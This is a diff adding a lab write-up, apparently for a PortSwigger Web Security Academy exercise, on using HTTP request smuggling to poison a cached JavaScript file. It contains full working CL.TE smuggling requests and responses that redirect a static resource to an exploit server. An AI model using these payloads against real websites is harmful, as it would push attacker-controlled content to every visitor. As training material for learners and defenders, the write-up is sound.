@@ -361,7 +361,144 @@ Prompt:
 >
 >Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.
 
-asdf
+Full disclosure on this one - it took me a fair bit of trial and error, and a hint from the solution to let me know I wasn't looking for HRS in the right place :) 
+
+step 1 - find a resource that's static, that's cached - that's our target to poison
+javascript is usually primed for this
+
+resource:
+```
+GET /resources/js/tracking.js HTTP/1.1
+Host: 0a9b006804cf1098809249aa001200b1.web-security-academy.net
+Cookie: session=hgM8eI6kSUkHNCJd85bQFUWSfEAmovg3
+```
+
+normal response:
+```HTTP
+HTTP/1.1 200 OK
+Content-Type: application/javascript; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=30
+Age: 7
+X-Cache: hit
+Connection: close
+Content-Length: 70
+
+document.write('<img src="/resources/images/tracker.gif?page=post">');
+```
+
+step 2 - find a way to smuggle requests
+
+initial attempt attack request:
+```
+POST / HTTP/1.1
+Host: 0a9b006804cf1098809249aa001200b1.web-security-academy.net
+Cookie: session=hgM8eI6kSUkHNCJd85bQFUWSfEAmovg3
+Content-Length: 169
+Transfer-Encoding: chunked
+
+0
+
+GET /exploit HTTP/1.1
+Host: exploit-0aec006f044a100b809b48d90123007b.exploit-server.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 153
+
+x=
+```
+
+response:
+```
+HTTP/1.1 404 Not Found
+Content-Type: application/json; charset=utf-8
+Set-Cookie: session=Hq3LvH31B1HrXJ6h6GqOxiOwANrWTKfZ; Secure; HttpOnly; SameSite=None
+X-Frame-Options: SAMEORIGIN
+Connection: close
+Content-Length: 11
+
+"Not Found"
+```
+
+step 3 - weaponize by finding a way to force the HRS to load our exploit
+
+attack request:
+```
+POST / HTTP/1.1
+Host: 0a9b006804cf1098809249aa001200b1.web-security-academy.net
+Cookie: session=hgM8eI6kSUkHNCJd85bQFUWSfEAmovg3
+Content-Length: 129
+Transfer-Encoding: chunked
+
+0
+
+
+GET /post/next?postId=2 HTTP/1.1
+Host: TESTHOST
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+
+x=
+```
+
+next normal response:
+```
+HTTP/1.1 302 Found
+Location: https://TESTHOST/post?postId=3
+Set-Cookie: session=0ui8ZxKF4XgBElhtQ3iVbrTxrFuVjQdD; Secure; HttpOnly; SameSite=None
+X-Frame-Options: SAMEORIGIN
+Connection: close
+Content-Length: 0
+
+
+```
+
+now we can modify the payload to have a real host, i.e. the exploit server
+
+```
+POST / HTTP/1.1
+Host: 0a9b006804cf1098809249aa001200b1.web-security-academy.net
+Cookie: session=hgM8eI6kSUkHNCJd85bQFUWSfEAmovg3
+Content-Length: 180
+Transfer-Encoding: chunked
+
+0
+
+
+GET /post/next?postId=2 HTTP/1.1
+Host: exploit-0aec006f044a100b809b48d90123007b.exploit-server.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+
+x=
+```
+
+step 4 - make sure we have a payload plugged into the exploit server
+
+exploitserver[.]jpg
+
+step 5 - get the server to cache the response, making all clients redirect to us on the static resource call
+
+this is the easy part - right after sending the attack payload from step 3, we immediately request `/resources/js/tracking.js` to ensure we're the first one to hit it, making it cache our exploit server response instead of the intended JS file
+
+```
+GET /resources/js/tracking.js HTTP/1.1
+Host: 0a9b006804cf1098809249aa001200b1.web-security-academy.net
+Cookie: session=hgM8eI6kSUkHNCJd85bQFUWSfEAmovg3
+```
+
+```HTTP
+HTTP/1.1 302 Found
+Location: https://exploit-0aec006f044a100b809b48d90123007b.exploit-server.net/post?postId=3
+Set-Cookie: session=QhSIFaFxbVtL7d6UCPltWuNNBXmcqIKK; Secure; HttpOnly; SameSite=None
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=30
+Age: 0
+X-Cache: miss
+Connection: close
+Content-Length: 0
+```
+
+now we have an alert box for any client that connects to the server!
 
 ## 0x12: Exploiting HTTP request smuggling to perform web cache deception
 
